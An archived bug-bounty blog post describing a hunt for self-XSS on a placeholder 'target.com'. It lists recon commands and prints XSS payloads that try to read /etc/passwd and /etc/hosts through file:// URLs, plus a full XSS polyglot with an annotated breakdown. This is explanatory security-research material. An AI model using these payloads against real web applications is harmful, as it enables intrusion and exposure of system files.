# 2 Self-XSS in 5 minutes

- **Source URL:** https://medium.com/@facu.tha/2-self-xss-in-5-minutes-7d517fab1e4d?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240108172905/https://medium.com/@facu.tha/2-self-xss-in-5-minutes-7d517fab1e4d
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4236 (id 4236)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 2 Self-XSS in 5 minutes

--

Alright guys,

In my latest post, I shared how I **hacked 3000 student records.** After my report and taking to the Security team I continued my search.

I wanted to do some high-level XSS search, however, **REMEMBER: —** “Nothing will uncover XSS vulnerabilities as thoroughly as manually going through each parameter, testing for injection, checking the context, and attempting to exploit it manually. It can be a slow, grinding process, but ultimately going to this much trouble will allow you to uncover vulnerabilities that others will miss” [BugCrowd](https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/)

As always, the target is “target.com”

# **HAPPYHACKING:**

Command 1:

`waybackurls target.com >> WB-target.com.txt`
Command 2:

`dirsearch -u https://target.com >> DS-target.com.txt`
Command 3:

`Parampsider -l alld.com.txt`
Command 5:

```
Ran each .txt file with | httpx -status-code
[].txt | httpx -mc 200 >> liveD.txt
```
Command 6:

`cat WB-target.com.txt | kxss`
RESULTS:

WOW WOW, not soo fast. **That result is meaningless without proper manual testing.**

# XSS => LFI

The next approach which I had seen in some blogs is to check if reading Local files was possible because all of this was happening locally.

These are the payloads that I used:

```
<script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```
`<script>document.write(%27<iframe%20src=file://///etc/hosts></iframe>%27);</script>``<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>`
Unfortunately, it did not work.

## Pro tip: I recommend using the Polyglot XSS payload

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e``
# [Anatomy of the polyglot (in a nutshell):](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot#anatomy-of-the-polyglot-in-a-nutshell)

`jaVasCript:`: A label in ECMAScript; a URI scheme otherwise.

``/*-/*`/*\`/*'/*"/**/``: A multi-line comment in ECMAScript; a literal-breaker sequence.

`(/* */oNcliCk=alert() )`: A tangled execution zone wrapped in invoking parenthesis!

`//%0D%0A%0d%0a//`: A single-line comment in ECMAScript; a double-CRLF in HTTP response headers.

`</stYle/</titLe/</teXtarEa/</scRipt/--!>`: A sneaky HTML-tag-breaker sequence.

`\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element.

Total length: 144 characters. *More info about this XSS*

Thanks for reading. Let’s connect on LinkedIn [www.linkedIn.com/in/facufernandez](http://www.linkedIn.com/in/facufernandez).

Stay tuned for more updates on this engagement!
